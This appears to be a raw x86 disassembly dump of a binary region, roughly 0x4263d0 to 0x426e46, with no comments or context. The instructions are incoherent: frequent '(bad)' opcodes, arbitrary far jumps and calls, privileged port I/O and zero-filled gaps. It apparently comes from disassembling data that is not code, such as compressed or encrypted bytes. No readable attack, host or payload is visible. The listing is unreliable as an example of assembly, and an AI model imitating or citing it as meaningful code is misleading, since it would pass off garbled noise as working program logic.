  4263d0:	mov    eax,ds:0x868f55d6
  4263d5:	scas   al,BYTE PTR es:[edi]
  4263d6:	pop    edx
  4263d7:	inc    ebp
  4263d8:	xchg   esp,eax
  4263d9:	or     ecx,DWORD PTR [ebx-0x61fc8489]
  4263df:	lods   al,BYTE PTR ds:[esi]
  4263e0:	cld    
  4263e1:	into   
  4263e2:	call   0x4007:0x32c9d881
  4263e9:	and    al,0xe5
  4263eb:	xor    DWORD PTR [ebp+esi*1-0x5fce1693],0xffffffa9
  4263f3:	mov    ds:0xc8ff3f47,eax
  4263f8:	jno    0x4263ea
  4263fa:	mov    eax,0x9f0a7293
  4263ff:	mov    dl,0x93
  426401:	pop    edx
  426402:	xchg   ebx,eax
  426403:	pop    DWORD PTR [ebp+0x509c498b]
  426409:	mov    WORD PTR ds:0x9a291b89,cs
  42640f:	jne    0x42644b
  426411:	mov    ?,WORD PTR [eax]
  426413:	push   0xb8988e7
  426418:	fnstsw ax
  42641a:	pushf  
  42641b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42641d:	adc    eax,0xc0996dbe
  426422:	nop
  426423:	out    0x8f,eax
  426425:	shl    ah,cl
  426427:	div    DWORD PTR [esp+esi*2-0x31]
  42642b:	inc    esp
  42642c:	pusha  
  42642d:	mov    dl,0x96
  42642f:	push   esp
  426430:	aaa    
  426431:	push   edi
  426432:	shl    DWORD PTR [esi],1
  426434:	dec    edx
  426435:	xor    eax,0x246b1308
  42643a:	sub    ah,dh
  42643c:	std    
  42643d:	out    0x93,eax
  42643f:	xchg   BYTE PTR [ecx+0x763fc927],dl
  426445:	(bad)  
  426446:	pop    ss
  426447:	rcl    BYTE PTR [eax+0x45ef1f16],0x21
  42644e:	xor    ch,BYTE PTR [ebp-0x3e]
  426451:	xor    ecx,0x24ab2f47
  426457:	mov    ebx,0x8cbf1ccc
  42645c:	pop    edx
  42645d:	add    DWORD PTR [ebp-0x9],ecx
  426460:	pop    edx
  426461:	jl     0x426410
  426463:	dec    esi
  426464:	adc    eax,0x97c30d6f
  426469:	and    edi,DWORD PTR [esi-0x6]
  42646c:	jne    0x4263fc
  42646e:	inc    esp
  42646f:	jmp    0xcdd5c5b0
  426474:	add    eax,0xc934dd51
  426479:	cmp    ch,ch
  42647b:	push   ebx
  42647c:	lods   al,BYTE PTR ds:[esi]
  42647d:	mov    ds:0x1229b2b3,al
  426482:	fwait
  426483:	dec    esi
  426484:	in     eax,0x8a
  426486:	add    BYTE PTR [edx],bl
  426488:	jmp    0x3c988eb5
  42648d:	cwde   
  42648e:	ss daa 
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x425cdf7b]
  426503:	jne    0x4264f1
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	out    0x35,eax
  42650e:	xor    dl,BYTE PTR [edx-0x2e]
  426511:	popa   
  426512:	or     al,0x81
  426514:	push   esp
  426515:	cmc    
  426516:	pop    ecx
  426517:	xchg   ecx,eax
  426518:	push   esi
  426519:	daa    
  42651a:	leave  
  42651b:	xor    dl,BYTE PTR [ecx+0x564c7d6b]
  426521:	push   cs
  426522:	and    al,0xdf
  426524:	sub    bl,dh
  426526:	jbe    0x426542
  426528:	aas    
  426529:	dec    ebp
  42652a:	add    BYTE PTR [edi],0x3f
  42652d:	call   0x56b7496d
  426532:	pop    edi
  426533:	mov    dl,al
  426535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426536:	ss dec ebp
  426538:	dec    ebp
  426539:	(bad)  
  42653a:	retf   0x18c1
  42653d:	pop    ecx
  42653e:	xchg   DWORD PTR [eax+0x56b2cae9],ebp
  426544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426545:	popa   
  426546:	add    al,0x81
  426548:	in     eax,0xa3
  42654a:	mov    bl,0xfd
  42654c:	push   esp
  42654d:	pusha  
  42654e:	sbb    esp,DWORD PTR [ecx]
  426550:	jmp    0xe401:0x50079a43
  426557:	aad    0xac
  426559:	xor    DWORD PTR [ebx-0x1],esi
  42655c:	(bad)  
  42655d:	test   eax,0x50ba5b92
  426562:	mov    esp,0x5c94cbf0
  426567:	inc    edi
  426568:	mov    esi,0x3144fb30
  42656d:	add    al,BYTE PTR [eax+0x38]
  426570:	pop    esi
  426571:	outs   dx,BYTE PTR ds:[esi]
  426572:	ret    0x4bee
  426575:	cmp    al,0x2d
  426577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426579:	push   0x1c
  42657b:	lds    esi,FWORD PTR [eax]
  42657d:	jp     0x42651f
  42657f:	imul   eax,DWORD PTR [eax],0x87ff92b
  426585:	cmp    edi,DWORD PTR [ebp+edx*1+0x3b50a0d3]
  42658c:	out    0xcc,eax
  42658e:	data16 fs mov dh,0xe7
  426592:	fstp   QWORD PTR [ebp-0x7a2803e8]
  426598:	dec    ecx
  426599:	outs   dx,DWORD PTR ds:[esi]
  42659a:	sub    ebp,DWORD PTR [eax-0x5307dc6f]
  4265a0:	lods   eax,DWORD PTR ds:[esi]
  4265a1:	mov    ds:0x9d325c32,eax
  4265a6:	lods   al,BYTE PTR ds:[esi]
  4265a7:	and    DWORD PTR [ebx-0xe],eax
  4265aa:	inc    ecx
  4265ab:	xchg   ecx,eax
  4265ac:	stc    
  4265ad:	out    dx,al
  4265ae:	push   ebp
  4265af:	mov    eax,0x52d14be9
  4265b4:	cmp    eax,ecx
  4265b6:	ret    
  4265b7:	xor    cl,BYTE PTR [ecx+esi*8-0x79]
  4265bb:	dec    esp
  4265bc:	jmp    0x42657b
  4265be:	pop    ebp
  4265bf:	pop    ds
  4265c0:	(bad)  
  4265c2:	mov    ah,BYTE PTR [edi+0x50]
  4265c5:	xor    esp,DWORD PTR [ebx]
  4265c7:	inc    esi
  4265c8:	add    ch,BYTE PTR [edi+0x10]
  4265cb:	mov    gs,WORD PTR [edi+ecx*2+0x2d4f5f58]
  4265d2:	ror    eax,0x95
  4265d5:	pop    ebx
  4265d6:	stos   DWORD PTR es:[edi],eax
  4265d7:	mov    ?,WORD PTR [edi+0x72a38376]
  4265dd:	pop    es
  4265de:	js     0x4265c8
  4265e0:	enter  0xb8c8,0x78
  4265e4:	jae    0x4265ee
  4265e6:	xchg   DWORD PTR [edx-0x7a],ebx
  4265e9:	fdiv   DWORD PTR ds:0xf7bda1b8
  4265ef:	ds sti 
  4265f1:	sub    eax,0x10612ee5
  4265f6:	add    al,0x8c
  4265f8:	in     eax,dx
  4265f9:	sbb    al,0xeb
  4265fb:	stc    
  4265fc:	sbb    bh,bh
  4265fe:	test   DWORD PTR ds:0xefc0319f,0xcafb26fb
  426608:	xchg   DWORD PTR [edi-0x4661d678],edx
  42660e:	fadd   QWORD PTR [eax+0x0]
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x15f7925c]
  426682:	add    al,0x7c
  426684:	lock cdq 
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	pop    esi
  42668d:	lods   al,BYTE PTR ds:[esi]
  42668e:	and    dh,BYTE PTR [ebp+0x6a]
  426691:	push   0xfffffff0
  426693:	push   edi
  426694:	into   
  426695:	ret    
  426696:	mov    dh,0x5b
  426698:	test   BYTE PTR [eax],0x3b
  42669b:	mov    ds:0x65d23442,eax
  4266a0:	jge    0x4266d4
  4266a2:	pop    edi
  4266a3:	xchg   bh,al
  4266a5:	cmp    eax,0x5e03b954
  4266aa:	mov    ah,0x14
  4266ac:	inc    esi
  4266ad:	pop    edx
  4266ae:	cmp    DWORD PTR [ebx-0x5da75a85],esp
  4266b4:	popa   
  4266b5:	push   esi
  4266b6:	bound  esp,QWORD PTR [ebx+esi*2+0x7d6afda0]
  4266bd:	stos   DWORD PTR es:[edi],eax
  4266be:	cli    
  4266bf:	jbe    0x42670b
  4266c1:	(bad)  
  4266c3:	(bad)  
  4266c4:	sub    eax,0xfaa5124e
  4266c9:	and    esp,DWORD PTR [esi+edi*2-0x710e32a6]
  4266d0:	add    ch,dh
  4266d2:	ja     0x4266ce
  4266d4:	sahf   
  4266d5:	and    eax,0x6f6e7b82
  4266da:	ss (bad) 
  4266dd:	out    dx,eax
  4266de:	add    DWORD PTR [ebx],ebx
  4266e0:	aad    0xab
  4266e2:	cmp    DWORD PTR [ebp+0x7a],esp
  4266e5:	xchg   DWORD PTR [ebx+0x15],ebp
  4266e8:	les    esp,FWORD PTR [eax+0x44c37bbb]
  4266ee:	aas    
  4266ef:	pop    edi
  4266f0:	mov    dh,0xf5
  4266f2:	call   0x7c972668
  4266f7:	mov    edx,0x865878e4
  4266fc:	dec    ebx
  4266fd:	add    eax,0xc6cf56b3
  426702:	mov    ah,0xd2
  426704:	into   
  426705:	jno    0x426776
  426707:	add    ecx,edi
  426709:	repnz inc ebx
  42670b:	stos   BYTE PTR es:[edi],al
  42670c:	dec    ebx
  42670d:	(bad)  
  42670f:	hlt    
  426710:	inc    eax
  426711:	in     al,0x4
  426713:	call   0x30f8:0xfbf1ffab
  42671a:	imul   edx,DWORD PTR [edx+0x11220367],0xfffffffd
  426721:	je     0x4266c9
  426723:	ds mov dh,0x72
  426726:	into   
  426727:	ins    BYTE PTR es:[edi],dx
  426728:	push   ebp
  426729:	pop    ss
  42672a:	or     DWORD PTR [esi-0x5dcc35b0],ebx
  426730:	sti    
  426731:	xor    BYTE PTR [eax+0x6c2c101],0x37
  426738:	mov    esp,0xd4e86101
  42673d:	mov    esp,0x446537
  426742:	dec    eax
  426743:	mov    eax,ds:0x60879990
  426748:	jae    0x426711
  42674a:	xchg   edx,eax
  42674b:	enter  0x6f55,0x5e
  42674f:	into   
  426750:	sbb    al,0x51
  426752:	mov    ah,0xa9
  426754:	push   ecx
  426755:	leave  
  426756:	cld    
  426757:	and    edx,DWORD PTR [edi]
  426759:	test   DWORD PTR [esi],ebp
  42675b:	rcl    WORD PTR [ecx+edx*2+0x66],1
  426760:	jnp    0x42673e
  426762:	xor    bl,al
  426764:	push   esi
  426765:	addr16 je 0x4267c0
  426768:	adc    eax,0xe0730892
  42676d:	push   ecx
  42676e:	xchg   edi,eax
  42676f:	icebp  
  426770:	fiadd  WORD PTR [ecx+eax*2-0x10f0d460]
  426777:	inc    ebx
  426778:	push   0x42d8cb1c
  42677d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42677e:	sbb    esp,ebx
  426780:	sar    DWORD PTR [eax-0x73807e98],cl
  426786:	xor    eax,DWORD PTR ds:0x97dc99b9
  42678c:	addr16 jbe 0x426766
  42678f:	sbb    al,BYTE PTR [eax]
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	hlt    
  426801:	test   DWORD PTR [ecx+0x19af47b],edx
  426807:	add    BYTE PTR [ecx+eax*1],al
  42680a:	add    BYTE PTR [eax],al
  42680c:	inc    esp
  42680d:	inc    esp
  42680e:	outs   dx,BYTE PTR ds:[esi]
  42680f:	test   DWORD PTR [esi],edi
  426811:	mov    cl,0x6
  426813:	repz jg 0x426836
  426816:	ror    bl,0xb6
  426819:	and    eax,0x941d7063
  42681e:	(bad)  
  426820:	ret    
  426821:	cmp    al,0xbe
  426823:	inc    eax
  426824:	fstp   DWORD PTR [ecx+0x48]
  426827:	mov    eax,0x1f850548
  42682c:	add    bh,bh
  42682e:	add    al,0x62
  426830:	pop    ebp
  426831:	icebp  
  426832:	(bad)  
  426833:	int    0x40
  426835:	push   ebp
  426836:	int3   
  426837:	xchg   esi,eax
  426838:	sub    eax,0x84aa9a16
  42683d:	(bad)  
  426840:	push   ecx
  426841:	cmp    eax,0xdb11a5f1
  426846:	int    0x3b
  426848:	pop    es
  426849:	pop    edx
  42684a:	adc    DWORD PTR [edi-0x655304a],esi
  426850:	loope  0x42683c
  426852:	push   ds
  426853:	mov    edi,0x33e2c109
  426858:	pop    ebp
  426859:	lds    esp,FWORD PTR [esi-0x41]
  42685c:	mov    dh,0xf3
  42685e:	mov    dh,0xa0
  426860:	test   al,0xa8
  426862:	push   edi
  426863:	sub    al,0xd5
  426865:	add    ch,BYTE PTR [edx+edi*8-0x50cedf61]
  42686c:	or     eax,0x9ba15e22
  426871:	ror    DWORD PTR [ecx-0x65],0x66
  426875:	ds dec esp
  426877:	aam    0x20
  426879:	mov    al,dh
  42687b:	fnstcw WORD PTR [ecx]
  42687d:	cs mov dh,0xff
  426880:	stos   BYTE PTR es:[edi],al
  426881:	lahf   
  426882:	jnp    0x426874
  426884:	xchg   esp,eax
  426885:	add    eax,0xc45e07e0
  42688a:	call   0x4aa7d7aa
  42688f:	push   ds
  426890:	aaa    
  426891:	ds pop esi
  426893:	in     eax,dx
  426894:	xor    BYTE PTR [ecx+0x4ad51761],bl
  42689a:	out    dx,al
  42689b:	test   ecx,esi
  42689d:	or     BYTE PTR [ebp-0xd9f15a1],0x76
  4268a4:	out    dx,al
  4268a5:	stos   DWORD PTR es:[edi],eax
  4268a6:	add    eax,edi
  4268a8:	(bad)  
  4268a9:	in     al,0x93
  4268ab:	adc    bh,BYTE PTR [ebp-0x3963abfc]
  4268b1:	les    esi,FWORD PTR [ebx+ecx*8-0x272ebb85]
  4268b8:	and    ch,bl
  4268ba:	stc    
  4268bb:	xlat   BYTE PTR ds:[ebx]
  4268bc:	test   al,0xc1
  4268be:	push   esi
  4268bf:	or     al,0xec
  4268c1:	sub    eax,0xf9b6bbf6
  4268c6:	dec    edi
  4268c7:	dec    eax
  4268c8:	aas    
  4268c9:	inc    ebx
  4268ca:	loopne 0x426923
  4268cc:	mov    edx,0x5a2c9573
  4268d1:	stos   DWORD PTR es:[edi],eax
  4268d2:	sbb    edi,DWORD PTR [ecx-0x73]
  4268d5:	in     eax,dx
  4268d6:	lahf   
  4268d7:	or     DWORD PTR [ebx-0x43],esi
  4268da:	xchg   DWORD PTR [ebp-0x21],ebp
  4268dd:	push   esp
  4268de:	push   eax
  4268df:	mov    eax,ds:0xe73917e6
  4268e4:	mov    ah,0xd4
  4268e6:	mov    bh,ah
  4268e8:	fdiv   DWORD PTR [esi]
  4268ea:	in     eax,dx
  4268eb:	and    esi,DWORD PTR [esi]
  4268ed:	xor    eax,0x5bfc5a39
  4268f2:	out    dx,eax
  4268f3:	xor    eax,0x78abee49
  4268f8:	lahf   
  4268f9:	and    ecx,esp
  4268fb:	imul   ebp,DWORD PTR [edx],0x5a9c1c38
  426901:	outs   dx,BYTE PTR ds:[esi]
  426902:	jae    0x4268d5
  426904:	and    edi,ecx
  426906:	aaa    
  426907:	sbb    BYTE PTR [ebx+0x45],dl
  42690a:	aas    
  42690b:	sti    
  42690c:	sub    edx,esi
  42690e:	dec    esp
  42690f:	push   0x0
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    edi,eax
  426981:	mov    eax,0x9bf85800
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	cmp    eax,0x6f1e7aa
  426991:	add    DWORD PTR ds:[ecx-0x7ffcc5c5],0xffffffcc
  426999:	push   ecx
  42699a:	in     eax,dx
  42699b:	or     BYTE PTR [eax],bh
  42699d:	scas   al,BYTE PTR es:[edi]
  42699e:	fwait
  42699f:	jp     0x42694f
  4269a1:	cmp    eax,0xa5599e81
  4269a6:	cmp    al,0x13
  4269a8:	push   esi
  4269a9:	sti    
  4269aa:	dec    ebx
  4269ab:	lahf   
  4269ac:	push   ss
  4269ad:	push   ebp
  4269ae:	ret    0xbb32
  4269b1:	loop   0x4269a0
  4269b3:	or     BYTE PTR [edx-0x1bd8bce],al
  4269b9:	jp     0x42698c
  4269bb:	fnstenv [esi-0x675828d3]
  4269c1:	int    0x58
  4269c3:	(bad)  
  4269c4:	fcomip st,st(5)
  4269c6:	(bad)  
  4269c7:	repnz cli 
  4269c9:	idiv   BYTE PTR ds:0xa6cf99de
  4269cf:	aad    0xce
  4269d1:	cmovae ecx,DWORD PTR [edi-0x5a]
  4269d5:	or     DWORD PTR [esi-0x56],esi
  4269d8:	xor    al,bl
  4269da:	das    
  4269db:	stc    
  4269dc:	or     BYTE PTR [ecx+esi*4],ch
  4269df:	or     bl,BYTE PTR [ecx]
  4269e1:	mov    ch,0x30
  4269e3:	adc    ecx,DWORD PTR [edx-0x47]
  4269e6:	aad    0xca
  4269e8:	push   ebp
  4269e9:	mov    ds:0x2cc5e364,al
  4269ee:	js     0x42699d
  4269f0:	and    BYTE PTR [ecx],cl
  4269f2:	push   edi
  4269f3:	push   esp
  4269f4:	jmp    0x42182ce2
  4269f9:	push   ebp
  4269fa:	fdiv   DWORD PTR [edx+0x7801bdbb]
  426a00:	sbb    BYTE PTR [ebx+0x40727906],bh
  426a06:	loopne 0x426a6d
  426a08:	stos   DWORD PTR es:[edi],eax
  426a09:	ja     0x426a2d
  426a0b:	dec    DWORD PTR [eax-0x70]
  426a0e:	(bad)  
  426a0f:	sub    al,0x34
  426a11:	cmp    DWORD PTR [edi+0x5fa8c5c9],esp
  426a17:	jns    0x4269d6
  426a19:	stc    
  426a1a:	sbb    al,0xe3
  426a1c:	in     al,dx
  426a1d:	in     eax,dx
  426a1e:	mov    ah,0xba
  426a20:	outs   dx,DWORD PTR ds:[esi]
  426a21:	jge    0x4269f9
  426a23:	xchg   ecx,eax
  426a24:	add    ebp,DWORD PTR [edx-0x37]
  426a27:	mov    eax,ds:0x3aba9db
  426a2c:	cmp    al,0xb4
  426a2e:	dec    edx
  426a2f:	les    esi,FWORD PTR [edi]
  426a31:	xor    DWORD PTR [edi-0x6a],ecx
  426a34:	in     eax,0x15
  426a36:	sbb    eax,DWORD PTR [edi]
  426a38:	hlt    
  426a39:	sub    DWORD PTR [eax+0x53],eax
  426a3c:	mov    ah,0x3f
  426a3e:	dec    ebx
  426a3f:	dec    eax
  426a40:	call   0xeaae231b
  426a45:	dec    BYTE PTR [edi+0x4eef1039]
  426a4b:	mov    cl,0xca
  426a4d:	or     bl,BYTE PTR [edx+0x1c8ab97]
  426a53:	jne    0x4269d8
  426a55:	xchg   esi,eax
  426a56:	pop    edi
  426a57:	push   esi
  426a58:	je     0x426a12
  426a5a:	pusha  
  426a5b:	and    dx,cx
  426a5e:	sbb    DWORD PTR [ecx+0x119a6be0],edi
  426a64:	(bad)  
  426a65:	(bad)  
  426a66:	adc    edx,DWORD PTR [eax-0x7c59f047]
  426a6c:	sbb    BYTE PTR [ebp+0x5c],ah
  426a6f:	cmp    BYTE PTR fs:[edx],ah
  426a72:	repnz jecxz 0x426ac2
  426a75:	and    DWORD PTR [edx+0x290d51cd],ecx
  426a7b:	pop    es
  426a7c:	jns    0x426a5f
  426a7e:	adc    BYTE PTR [ecx-0x69],bl
  426a81:	sub    al,0xa8
  426a83:	push   ebp
  426a84:	jo     0x426a97
  426a86:	cmp    DWORD PTR [esi-0x1d],edi
  426a89:	scas   eax,DWORD PTR es:[edi]
  426a8a:	jmp    0x24ba1482
  426a8f:	imul   eax,DWORD PTR [eax],0x0
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xb8
  426b01:	(bad)  
  426b02:	out    0x96,al
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	arpl   WORD PTR [ebx],cx
  426b0e:	ja     0x426b24
  426b10:	les    eax,FWORD PTR [edx+ecx*2]
  426b13:	pushf  
  426b14:	push   edi
  426b15:	xchg   ebp,eax
  426b16:	stos   DWORD PTR es:[edi],eax
  426b17:	dec    BYTE PTR ds:0x2339f0a
  426b1d:	and    ebx,DWORD PTR [ebx-0x68]
  426b20:	popf   
  426b21:	lods   eax,DWORD PTR ds:[esi]
  426b22:	or     BYTE PTR [eax+ebx*8-0x16],dl
  426b26:	into   
  426b27:	loopne 0x426b99
  426b29:	fsub   QWORD PTR [ebx+0x28c9e13c]
  426b2f:	rcr    edi,1
  426b31:	push   edi
  426b32:	int    0x9e
  426b34:	test   DWORD PTR [edx],eax
  426b36:	adc    ebx,DWORD PTR [edx-0x60]
  426b39:	add    eax,0x4c543106
  426b3e:	mov    bh,0x28
  426b40:	lods   al,BYTE PTR ds:[esi]
  426b41:	mov    ss,WORD PTR [ebp+0x7d]
  426b44:	jnp    0x426b57
  426b46:	inc    eax
  426b47:	inc    edx
  426b48:	ds fsubp st(3),st
  426b4b:	inc    ebp
  426b4c:	fwait
  426b4d:	lahf   
  426b4e:	or     BYTE PTR cs:[esi+0x6934b8f2],dl
  426b55:	add    al,0x5d
  426b57:	push   ebp
  426b58:	jmp    0x5c30:0x83c0e64a
  426b5f:	mov    edi,0x953af415
  426b64:	dec    edi
  426b65:	cmp    eax,0x3f1e63bb
  426b6a:	mov    WORD PTR [edi-0x62],es
  426b6d:	inc    esp
  426b6e:	pop    esp
  426b6f:	mov    dh,0x8f
  426b71:	inc    ecx
  426b72:	jmp    0xd660:0x701e6347
  426b79:	inc    eax
  426b7a:	repnz cmp DWORD PTR [edx],edx
  426b7d:	loopne 0x426b8a
  426b7f:	in     eax,0xd4
  426b81:	add    DWORD PTR [ecx-0x6c],eax
  426b84:	and    al,0x0
  426b86:	mov    edx,0xdd229f45
  426b8b:	cwde   
  426b8c:	shl    BYTE PTR [edi+0x42],cl
  426b8f:	aas    
  426b90:	and    DWORD PTR [ecx],edx
  426b92:	arpl   WORD PTR [edx],bp
  426b94:	mov    al,ds:0x60aba04f
  426b99:	or     BYTE PTR [eax-0x2e3e74b6],0xb5
  426ba0:	add    al,0x66
  426ba2:	stos   DWORD PTR es:[edi],eax
  426ba3:	mov    edi,0x99622bf0
  426ba8:	mov    es,WORD PTR [eax-0x50]
  426bab:	jl     0x426b53
  426bad:	and    esi,ebp
  426baf:	jae    0x426b44
  426bb1:	sbb    BYTE PTR [esi-0x74ff69ee],al
  426bb7:	add    al,0x4c
  426bb9:	mov    edi,0xb0c04526
  426bbe:	mov    bl,al
  426bc0:	mov    edx,ebp
  426bc2:	fstp   st(0)
  426bc4:	in     al,0x10
  426bc6:	(bad)  
  426bc7:	cwde   
  426bc8:	xor    BYTE PTR [esi-0x20],dl
  426bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bcc:	(bad)  [ebp+0x5d]
  426bcf:	xchg   BYTE PTR [ebx+0xfabe79d],bl
  426bd5:	dec    edx
  426bd6:	out    dx,al
  426bd7:	outs   dx,DWORD PTR ds:[esi]
  426bd8:	(bad)  
  426bd9:	(bad)  
  426bda:	iret   
  426bdb:	ss jg  0x426b73
  426bde:	cmp    ch,bl
  426be0:	or     eax,0xcf637748
  426be5:	and    eax,0xb111d6f8
  426bea:	(bad)  
  426beb:	ins    DWORD PTR es:[edi],dx
  426bec:	push   edi
  426bed:	das    
  426bee:	retf   0xb74a
  426bf1:	(bad)  
  426bf3:	dec    ebp
  426bf4:	mov    esi,0x6907de16
  426bf9:	nop
  426bfa:	jo     0x426c54
  426bfc:	das    
  426bfd:	add    al,ah
  426bff:	sbb    DWORD PTR [esp+ecx*2+0x29],eax
  426c03:	(bad)  
  426c05:	jle    0x426bbb
  426c07:	mov    eax,0x2e8dc94
  426c0c:	ss in  al,0x12
  426c0f:	cli    
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x190832e
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	leave  
  426c8d:	lahf   
  426c8e:	pop    eax
  426c8f:	inc    eax
  426c90:	jns    0x426ca6
  426c92:	sub    dh,BYTE PTR [ecx+0x5694f928]
  426c98:	xchg   edx,eax
  426c99:	sub    DWORD PTR [esi-0x6050e8ff],0x2464b1e1
  426ca3:	jmp    FWORD PTR [ecx+0x3e56aa4]
  426ca9:	mov    eax,ds:0x86adcc7f
  426cae:	jg     0x426ca8
  426cb0:	cmp    ecx,DWORD PTR [eax]
  426cb2:	loopne 0x426cee
  426cb4:	cmp    al,0xa3
  426cb6:	xchg   esp,eax
  426cb7:	retf   
  426cb8:	pop    edx
  426cb9:	cmp    eax,0x66166c86
  426cbe:	in     al,dx
  426cbf:	lods   al,BYTE PTR ds:[esi]
  426cc0:	fistp  WORD PTR [esp+edx*8-0x1b9669dd]
  426cc7:	int    0x7
  426cc9:	aad    0xbf
  426ccb:	int3   
  426ccc:	sub    ebx,DWORD PTR [esi+0x2c91caf5]
  426cd2:	and    ecx,DWORD PTR [esi]
  426cd4:	add    BYTE PTR [edi+0x4d9e0504],ch
  426cda:	scas   eax,DWORD PTR es:[edi]
  426cdb:	aam    0x1
  426cdd:	mov    edx,0x236981d7
  426ce2:	rcr    DWORD PTR [esi+0x4950c0df],0x87
  426ce9:	and    ebp,DWORD PTR [edx]
  426ceb:	and    al,0x51
  426ced:	and    al,0x70
  426cef:	pop    edx
  426cf0:	add    DWORD PTR [edi+0x4e],esi
  426cf3:	jne    0x426cb5
  426cf5:	push   edx
  426cf6:	fstp   st(0)
  426cf8:	retf   
  426cf9:	and    dl,BYTE PTR [ecx-0x6e]
  426cfc:	pop    eax
  426cfd:	xor    bl,BYTE PTR [edx-0x48]
  426d00:	and    BYTE PTR [ecx],ch
  426d02:	pushf  
  426d03:	xlat   BYTE PTR ds:[ebx]
  426d04:	or     esi,esi
  426d06:	inc    ebx
  426d07:	rcl    DWORD PTR [edx],0x17
  426d0a:	iret   
  426d0b:	stos   DWORD PTR es:[edi],eax
  426d0c:	aaa    
  426d0d:	inc    edi
  426d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d0f:	sub    BYTE PTR [edx-0x2a],al
  426d12:	and    edi,DWORD PTR [ebp+eax*1-0x22]
  426d16:	jbe    0x426d3d
  426d18:	sbb    bh,BYTE PTR [edi-0x39]
  426d1b:	ffreep st(0)
  426d1d:	mov    al,ds:0xa306889d
  426d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d23:	add    edi,DWORD PTR [edi]
  426d25:	jmp    0x37f66bcd
  426d2a:	sbb    BYTE PTR [esp+ebx*2],0xdc
  426d2e:	scas   eax,DWORD PTR es:[edi]
  426d2f:	jge    0x426cc7
  426d31:	not    BYTE PTR [edi+edx*2+0x6f]
  426d35:	sub    BYTE PTR gs:[esi+0x360c46ff],0x87
  426d3d:	adc    edx,ecx
  426d3f:	xor    al,0x58
  426d41:	ret    
  426d42:	sti    
  426d43:	mov    eax,ds:0x40701a89
  426d48:	xchg   ebx,eax
  426d49:	pop    edi
  426d4a:	jno    0x426d2a
  426d4c:	mov    dh,0xb1
  426d4e:	ficom  DWORD PTR [ebp+0x6dd98d92]
  426d54:	xor    eax,0xf9d81df3
  426d59:	fisttp DWORD PTR [ebx]
  426d5b:	cmp    eax,0x46c95558
  426d60:	out    0x8e,al
  426d62:	jns    0x426d95
  426d64:	enter  0x7ec9,0xc2
  426d68:	jl     0x426da1
  426d6a:	jmp    ebp
  426d6c:	adc    al,0x71
  426d6e:	adc    DWORD PTR [edx-0x7b4049e],esp
  426d74:	or     DWORD PTR ds:0xc48a9dcd,ebx
  426d7a:	xchg   edx,eax
  426d7b:	sbb    bh,0x49
  426d7e:	inc    ebp
  426d7f:	and    DWORD PTR [ebp+0xd4e55f4],esp
  426d85:	dec    ebp
  426d86:	lods   al,BYTE PTR ds:[esi]
  426d87:	inc    edx
  426d88:	bound  eax,QWORD PTR [eax-0x158e4fbc]
  426d8e:	push   0x74
	...
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xc80c:0xc7c2ecf9
  426e01:	mov    dh,0xa1
  426e03:	fadd   DWORD PTR [edi+ebx*4]
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	cs pushf 
  426e0e:	sbb    eax,0x8623eaa2
  426e13:	and    ah,BYTE PTR [ebx+eax*4]
  426e16:	cmp    eax,DWORD PTR [ecx-0x61]
  426e19:	ss mov ebx,0xe0f073aa
  426e1f:	out    0xec,al
  426e21:	pushf  
  426e22:	push   eax
  426e23:	mov    ecx,DWORD PTR [eax+0x47]
  426e26:	push   ebp
  426e27:	mov    ecx,esi
  426e29:	loopne 0x426dd2
  426e2b:	jne    0x426eac
  426e2d:	call   FWORD PTR [esi]
  426e2f:	sub    BYTE PTR [ebp+0x68],bh
  426e32:	mov    ch,0x8a
  426e34:	xchg   edi,eax
  426e35:	mov    ch,dl
  426e37:	push   ds
  426e38:	aaa    
  426e39:	fdivr  st(6),st
  426e3b:	lods   eax,DWORD PTR ds:[esi]
  426e3c:	add    BYTE PTR [ecx],ch
  426e3e:	sub    bh,BYTE PTR [edi]
  426e40:	xor    DWORD PTR [eax+0x2e52436f],eax
  426e46:	jmp    FWORD PTR [edi+0x69]
